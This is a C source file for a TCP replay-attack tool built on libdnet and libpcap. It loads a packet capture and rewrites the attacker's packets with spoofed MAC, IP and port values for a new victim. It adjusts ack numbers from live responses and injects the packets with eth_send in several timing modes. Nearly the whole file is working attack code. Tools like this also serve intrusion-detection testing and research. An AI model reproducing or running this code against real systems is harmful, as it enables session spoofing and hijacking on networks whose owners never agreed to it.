#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <sys/types.h>
#include <fcntl.h>
#include <dnet.h>
#include <pcap.h>
#include <endian.h>
#include <pcap.h>

#include "utils.h"
#include "replay-atk.h"


static int DEBUG;								/** debugging verbosity level : 1 for normal, 2 for extra  **/
static int SEND;								/** send to network switch **/
static char command_line_file[1024];	/** filename placed on the commandline **/

void print_packet(struct pcap_pkthdr* pheader,const u_char *pack)
{
	struct eth_hdr *eheader;
	struct ip_hdr  *ipheader;
	struct tcp_hdr *tcpheader;

	eheader = (struct eth_hdr *) pack;
	ipheader = (struct ip_hdr *)(pack + ETH_HDR_LEN);	
	tcpheader = (struct tcp_hdr *) (pack + ETH_HDR_LEN + (ipheader->ip_hl*4));

	fprintf(stderr,"Captured packet length: %u\n",pheader->caplen);
	fprintf(stderr,"Actual packet length: %u\n",pheader->len);
	fprintf(stderr,"   eth_src = %s\n",eth_ntoa(&(eheader->eth_src)));
	fprintf(stderr,"   eth_dst = %s\n",eth_ntoa(&eheader->eth_dst));
	fprintf(stderr,"      ip len = %u\n",ntohs(ipheader->ip_len));
	fprintf(stderr,"      ip src = %s\n",ip_ntoa(&ipheader->ip_src));
	fprintf(stderr,"      ip dest = %s\n",ip_ntoa(&ipheader->ip_dst));
	fprintf(stderr,"      ip header length = %u\n",ipheader->ip_hl);
	fprintf(stderr,"      TCP\n");
   fprintf(stderr,"         Src Port: %u\n",ntohs(tcpheader->th_sport));
	fprintf(stderr,"         Dest Port: %u\n",ntohs(tcpheader->th_dport));
	fprintf(stderr,"         Seq = %u\n",ntohl(tcpheader->th_seq));
	fprintf(stderr,"         Ack = %u\n",ntohl(tcpheader->th_ack));	
	fprintf(stderr,"\n\n");																								 	
	return;
}

void init_info(struct info_t *info)
{
	int i;
	
	info->total_packets = 0;
	info->ack = 0;
	info->current_packet = 0;

	for(i = 0; i < MAX_PACKETS; i++)
		info->response_packets[i] = 0;
		
}

int load_address(FILE *fp,struct address_t *address)
{
	char a_ip[32];   		//ascii ip buffer 
	char a_mac[32];  		//ascii mac address
	char a_port[32];		//ascii port number


	if(fgetsn(a_ip,32,fp) == NULL)
		return -1;

	if(addr_pton(a_ip,&(address->ip)) == -1)
	{	
		fprintf(stderr,"IP address is badly formatted\n");
		return -1;
	}

	if(fgetsn(a_mac,32,fp) == NULL)
		return -1;
	
   if(addr_pton(a_mac,&(address->mac)) == -1)
	{
		fprintf(stderr,"Mac address is badly formatted\n");
		return -1;
	}
	
	if(fgetsn(a_port,sizeof(a_port),fp) == NULL)
		return -1;

   address->port = (uint16_t) atoi(a_port);
	
	return 0;
}

int readcfg(char *filename, struct file_config_t *c)
{
	FILE *fp;
	char buf[32];

	fp = fopen(filename,"r");
	if(fp == NULL){
		perror("Unable to open config file...");
		return -1;
	}

	if(fgetsn(c->tcpfile,sizeof(c->tcpfile),fp) == NULL)
		return -1;
	
	load_address(fp,&(c->victim));
	load_address(fp,&(c->attacker));	
	load_address(fp,&(c->rvictim));
	load_address(fp,&(c->rattacker));
	
	if(fgetsn(c->iface,sizeof(c->iface),fp) == NULL)
		return -1;

	if(fgetsn(buf,sizeof(buf),fp) == NULL)
		return -1;
	
	if(strcmp("continuous",buf) == 0)
		c->timing = TIMING_CONTINUOUS;

	else if(strcmp("delay",buf) == 0)
		c->timing = TIMING_DELAY;
	
	else if(strcmp("reactive",buf) == 0)
		c->timing = TIMING_REACTIVE;
	
	else if(strcmp("wait",buf) == 0)
		c->timing = TIMING_WAIT;

	else if(strcmp("exact",buf) == 0)
		c->timing = TIMING_EXACT;
	else
		c->timing = TIMING_OTHER;

	fclose(fp);
	return 0;
}

void read_tcp_handler(u_char *user, struct pcap_pkthdr *pheader,const u_char *pack)
{
	struct eth_hdr *eheader;
	struct ip_hdr *ipheader;
	struct tcp_hdr *tcpheader;
	struct addr srcadd;	
	struct info_t *info;
	struct file_config_t *c;
	static unsigned int packetno = 0;		//number of packets sent by attacker
	static unsigned int place = -1;			 
	//static unsigned int response_bytes;
	
	eheader = (struct eth_hdr *)pack;
	ipheader = (struct ip_hdr *)(pack + ETH_HDR_LEN);
	tcpheader = (struct tcp_hdr *) (pack + ETH_HDR_LEN + IP_HDR_LEN);
	
	info = (struct info_t *) user;
	c = &(info->config);
		
	/* if the packet originated from the attacker **/	
	addr_pack(&srcadd,ADDR_TYPE_IP,IP_ADDR_BITS,&(ipheader->ip_src),IP_ADDR_LEN);	
	if( addr_cmp(&srcadd,&(c->attacker.ip)) == 0  )
	{	
		/* modify source mac and ip address of packets to be the replay attackers address */
		memcpy(&(eheader->eth_src),&(c->rattacker.mac.addr_eth),ETH_ADDR_LEN);
		memcpy(&(ipheader->ip_src),&(c->rattacker.ip.addr_ip),IP_ADDR_LEN);	
		tcpheader->th_sport = htons(c->rattacker.port);

  	 	/* modify destination mac and ip address of the packet to be replay victim addresses */
		memcpy(&(eheader->eth_dst),&(c->rvictim.mac.addr_eth),ETH_ADDR_LEN);
		memcpy(&(ipheader->ip_dst),&(c->rvictim.ip.addr_ip),IP_ADDR_LEN);
		tcpheader->th_dport = htons(c->rvictim.port);

		if(packetno == MAX_PACKETS)
		{
			fprintf(stderr,"Out of packets.. :(\n");
			exit(-1);   //exit for debugging
		}

		/* must save the packet headers into memory so that we can use them later */
		info->packet_headers[packetno] = malloc(sizeof(struct pcap_pkthdr));
		if(info->packet_headers[packetno] == NULL)
		{
			perror("unable to malloc packet header");
			return;
		}
		memcpy(info->packet_headers[packetno],pheader,sizeof(struct pcap_pkthdr));
	
		/* same for the actual packets themselves */
		info->packets[packetno] = malloc(pheader->len);
		if(info->packets[packetno] == NULL)
		{
			perror("Unable to malloc packet data");
			return;
		}
		memcpy((void *)info->packets[packetno],pack,pheader->len);
		info->total_packets = ++packetno;
		place++;	
	}
	else						//else the packet came from the victim
	{
		info->response_packets[place]++;	
	}

	if(DEBUG == 2)
	{
		fprintf(stderr,"-------Read packet from tcp file  ------------\n");
		print_packet(pheader,pack);
	}

	if(info->response_packets[place] != 0 && DEBUG == 2)
	{	
		fprintf(stderr,"Expecting %u return packets (packetno = %u)\n",info->response_packets[place],place);
	}

	return;
}

#define TCP_FILE_FILTER "tcp and ((dst host %s and src host %s) or (dst host %s and src host %s))"

int read_tcp_file(struct info_t *info)
{
	char ebuf[4096];
	char cmd[1024];
	struct bpf_program fcode;
	uint32_t netmask,localnet;	
	struct intf_entry interface_entry;
	struct file_config_t *c;
	intf_t *interface;
	pcap_t *offline_pcap;
		
	
	/* open the interface */
	interface = intf_open();	
	if(interface == NULL)
	{
		perror("intf open error");
		return -1;
	}

	/* get the specified interface as specified in configuration file */
	c = &(info->config);
	strncpy(interface_entry.intf_name,c->iface,sizeof(c->iface));

	if( intf_get(interface,&(interface_entry)) == -1)
	{
		perror("intf get error");
		return -1;
	}
	
	/* once we have the info, save our mac and ip addresses */
	c->middle.mac = interface_entry.intf_link_addr;							
	c->middle.ip = interface_entry.intf_addr;

	/* open an offline pcap to read the tcp file */
	offline_pcap = pcap_open_offline(c->tcpfile,ebuf);
	if(offline_pcap == NULL)
	{
		perror("pcap_open_offline");
		return -1;
	}	  

	if(pcap_lookupnet(c->iface,&localnet,&netmask,ebuf) < 0)
	{
		fprintf(stderr,"pcap_lookupnet: %s\n",ebuf);
		return -1;
	}			 
	
	/* set the filter of the offline pcap to that specified in the config file */ 
	snprintf(cmd,sizeof(cmd),TCP_FILE_FILTER,
			  addr_ntoa(&(c->victim.ip)),addr_ntoa(&(c->attacker.ip)),
			  addr_ntoa(&(c->attacker.ip)),addr_ntoa(&(c->victim.ip)));	

	if(pcap_compile(offline_pcap,&fcode,cmd,0,netmask) < 0)
	{
		fprintf(stderr,"pcap_compile %s\n",pcap_geterr(offline_pcap));
		return -1;
	}

   if(pcap_setfilter(offline_pcap,&fcode) < 0)
	{
		fprintf(stderr,"pcap_setfilter: %s\n",pcap_geterr(offline_pcap));
		return -1;
	}

	if(DEBUG == 2)
		fprintf(stderr,"----------tcp file: %s-------------------\n",c->tcpfile);
	
	if(pcap_loop(offline_pcap,-1,(pcap_handler)read_tcp_handler,(u_char *)info) < 0)
	{
		fprintf(stderr,"%s: pcap_loop: %s\n","proxy",pcap_geterr(offline_pcap));
		return -1;
	}
	
	return 0;
}

void replay_attack_handler(u_char *user, struct pcap_pkthdr *pheader,const u_char *pack)
{
	
	//int response_bytes;
	int tcp_bytes;
	unsigned int packetno;
	uint8_t th_flags;
	struct info_t *info;
	struct ip_hdr *ipheader;
	struct tcp_hdr *tcpheader;
		
	info = (struct info_t *) user;	
  	ipheader = (struct ip_hdr *) (pack+ETH_HDR_LEN);
	tcpheader = (struct tcp_hdr *) (pack + ETH_HDR_LEN + (ipheader->ip_hl*4));
	packetno = info->current_packet;
	
	fprintf(stderr,"----------Read packet from network ---------\n");
	print_packet(pheader,pack);	
	

	tcp_bytes = ((pheader->len) - ETH_HDR_LEN - ((ipheader->ip_hl)*4) - ((tcpheader->th_off)*4));
	//info->ack = (htonl(ntohl(tcpheader->th_seq) + (tcp_bytes == 0 ? 1 : tcp_bytes)));	
	
	
	info->ack = ntohl(tcpheader->th_seq) + tcp_bytes;
	th_flags = tcpheader->th_flags;
		
	if(th_flags == TH_SYN || th_flags == TH_FIN || th_flags == (TH_SYN + TH_ACK) )	
		info->ack++;

	info->ack = htonl(info->ack);
	info->response_packets[packetno]--;
	

	fprintf(stderr,"TCP BYTES %u\n",tcp_bytes);
	//fprintf(stderr,"Response bytes %d\n",response_bytes);
	//fprintf(stderr,"response_packets (retrans) = %d\n",info->response_packets[packetno]);
	return;	
} 

int replay_attack(struct info_t *info)
{
	int i,n,skip,timing;	
	unsigned int packetno;
	struct ip_hdr *ipheader;
	struct tcp_hdr *tcpheader;
	struct pcap_pkthdr *pheader;
	const u_char *pack;
	struct timespec ts;	
	
	ts.tv_sec = 0;
	ts.tv_nsec = 500000000;

	packetno = 0;
	skip = 0;


	timing = info->config.timing;
	if(timing == TIMING_CONTINUOUS || timing == TIMING_DELAY)
		skip = 1;

	fprintf(stderr,"------------Init attack ---------------\n");
	for(i = 0; i < info->total_packets; i++)
	{
		ipheader = (struct ip_hdr *) (info->packets[i] + ETH_HDR_LEN);
		tcpheader = (struct tcp_hdr *) (info->packets[i] + ETH_HDR_LEN + (ipheader->ip_hl*4));   
		tcpheader->th_ack = info->ack;		  
	   ip_checksum((void *)ipheader,ntohs(ipheader->ip_len));	

		fprintf(stderr,"----------Sending Packet (%u) -------------------------\n",packetno);
		print_packet(info->packet_headers[i],info->packets[i]);
			
		if(timing == TIMING_DELAY)
		{
			fprintf(stderr,"sleeping..\n");
			nanosleep(&ts,NULL);
		}

		n = eth_send(info->network.ethernet,info->packets[i],(info->packet_headers[i])->len);
		if(n != info->packet_headers[i]->len)
		{
			fprintf(stderr,"Partial packet transmission %d/%d",n,info->packet_headers[i]->len);
			return -1;
		}

		fprintf(stderr,"Packet sent\n");	

		if(skip == 1)
		{
			packetno++;
			info->current_packet++;
			continue;
		}

		while(info->response_packets[i] > 0)
		{
			
			if(timing == TIMING_WAIT)
			{				  
				if(pcap_loop(info->network.pcap,1,(pcap_handler)replay_attack_handler,(u_char *)info) < 0)
				{
					fprintf(stderr,"%s: pcap_loop: %s\n","proxy",pcap_geterr(info->network.pcap));
					return -1;
				}
			}
			else if(timing == TIMING_REACTIVE)
			{		  
				if(pcap_next_ex(info->network.pcap,&pheader,&pack))
				{
					replay_attack_handler((u_char *)info,pheader,pack);
				}
				else
				{
					fprintf(stderr,"Timed out..\n");
					break;
				}

			}
			
			fprintf(stderr,"response packets = %d\n",info->response_packets[i]);
		}


		packetno++;	
		info->current_packet++;
		
	}//for 
	return 0;
}

int init_devices(struct info_t *info)
{
	uint32_t localnet,netmask;
	char *interface_name;
	char ebuf[2048];
	char cmd[256];
	char a_sip[64];
	char a_dip[64];
	struct intf_entry interface_entry;
	struct bpf_program fcode;
	pcap_t *online_pcap;	
	intf_t *interface;
	eth_t *ethernet;

	interface_name = info->config.iface;
	interface = intf_open();
	if(interface == NULL)
	{
		perror("intf_open error");
		return -1;
	}
	
	strncpy(interface_entry.intf_name,interface_name,60);
	if(intf_get(interface,&interface_entry) == -1)
	{
		perror("intf ger error");
		return -1;
	}
	
	ethernet = eth_open(interface_name);
	if(ethernet == NULL)
	{
		perror("eth open error");
		return -1;
	}	  
	
	online_pcap = pcap_open_live(interface_name,65535,1,1000,ebuf);
	if(online_pcap == NULL)
	{
		perror(ebuf);
		return -1;
	}

	if(pcap_lookupnet(interface_name,&localnet,&netmask,ebuf) < 0)
	{
		fprintf(stderr,"pcap_looknet: %s\n",ebuf);
		return -1;
	}

	addr_ntop(&(info->config.rattacker.ip),a_dip,sizeof(a_dip));
	addr_ntop(&(info->config.rvictim.ip),a_sip,sizeof(a_sip));
	rmslash(a_sip);
	rmslash(a_dip);

	snprintf(cmd,sizeof(cmd),"tcp and dst host %s and src host %s",a_dip,a_sip);

	if( pcap_compile(online_pcap,&fcode,cmd,0,netmask) < 0)
	{
		fprintf(stderr,"pcap_compile: %s\n",pcap_geterr(online_pcap));
		return -1;
	}

	if(pcap_setfilter(online_pcap,&fcode) < 0)
	{
		fprintf(stderr,"pcap_setfilter %s\n",pcap_geterr(online_pcap));
		return -1;
	}

	info->network.ethernet = ethernet;
	info->network.pcap = online_pcap;
	return 0;

}

void usage()
{
	fprintf(stderr,"attgen [-sv] <configuration file>\n");
	return;

}

/** make sure argc is at least 2 before calling this **/
int  parse_commandline(int argc, char *argv[])
{
	int i;

	for(i = 1; i < argc -1; i++)
	{
		if(strcmp("-s",argv[i]) == 0)
		{
			fprintf(stderr,"Sending packets to network\n\n");
			SEND = 1;
		}
		else if(strcmp("-v",argv[i]) == 0)
		{
			fprintf(stderr,"Verbose for debugging\n\n");
			DEBUG = 1;
		}
		else if(strcmp("-vv",argv[i]) == 0)
		{
			fprintf(stderr,"Extra verbose\n");
			DEBUG = 2;
		}
		else
		{
			fprintf(stderr,"Invalid option %s\n",argv[i]);
			usage();
			return -1;
		}	
	}
	
	strncpy(command_line_file,argv[argc-1],sizeof(command_line_file));
	return 0;
}

int main(int argc, char *argv[])
{
	struct info_t info;

  	SEND = 0;
  	DEBUG = 0;	
	
	if(argc < 2)
	{
		usage();
		return -1;
	}
	
	if(parse_commandline(argc,argv))
		return -1;


	init_info(&info);
	readcfg(command_line_file,&(info.config));

	if(DEBUG)
	{
		fprintf(stderr,"Victim ip address: %s\n",addr_ntoa(&(info.config.victim.ip)));
		fprintf(stderr,"Victim mac address: %s\n",addr_ntoa(&(info.config.victim.mac)));
		fprintf(stderr,"Victim port: %u\n",info.config.victim.port);
		fprintf(stderr,"Attacker ip address: %s\n",addr_ntoa(&(info.config.attacker.ip)));
		fprintf(stderr,"Attacker mac address: %s\n",addr_ntoa(&(info.config.attacker.mac)));
		fprintf(stderr,"Attacker port: %u\n",info.config.attacker.port);
		fprintf(stderr,"Replay victim ip address: %s\n",addr_ntoa(&(info.config.rvictim.ip)));
		fprintf(stderr,"Replay victim mac address: %s\n",addr_ntoa(&(info.config.rvictim.mac)));
		fprintf(stderr,"Replay victim port: %u\n",info.config.rvictim.port);
		fprintf(stderr,"Replay attacker ip address: %s\n",addr_ntoa(&(info.config.rattacker.ip)));
		fprintf(stderr,"Replay attacker mac address: %s\n",addr_ntoa(&(info.config.rattacker.mac)));
		fprintf(stderr,"Replay attacker port: %u\n",info.config.rattacker.port);
		fprintf(stderr,"Timming mode: %d\n",info.config.timing);
		fprintf(stderr,"--------------------------------------------------------\n");
		fprintf(stderr,"\n\n\n");
	}
	
	read_tcp_file(&info);
	
	if(DEBUG)
	{
		fprintf(stderr,"---------------------------------------------------------\n");
		fprintf(stderr,"interface name: %s\n",info.config.iface);
		fprintf(stderr,"Machine mac address: %s\n",addr_ntoa(&(info.config.middle.mac)));
		fprintf(stderr,"Machine ip address: %s\n",addr_ntoa(&(info.config.middle.ip)));	
		fprintf(stderr,"----------------------------------------------------------\n");
		fprintf(stderr,"\n\n");
	}

	init_devices(&info);
	
	if(SEND)
	{
		replay_attack(&info);	
	}

	return 0;
}
